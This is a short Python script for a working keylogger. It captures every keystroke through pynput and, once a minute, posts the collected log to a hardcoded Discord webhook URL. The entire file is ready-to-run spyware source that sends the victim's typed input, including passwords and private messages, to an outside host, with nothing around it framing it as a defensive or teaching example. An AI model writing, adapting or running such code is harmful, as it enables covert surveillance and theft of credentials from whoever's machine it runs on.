from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener


WEBHOOK_URL = 'https://discord.com/api/webhooks/1240258493018148865/B_OpE6H5fwvgQUsjwJ75YwJuG-4_g0YAzHH8MKkNrztA5bc501yiwwWBgxtKPdxbd8fi'
TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds.


class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()


if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
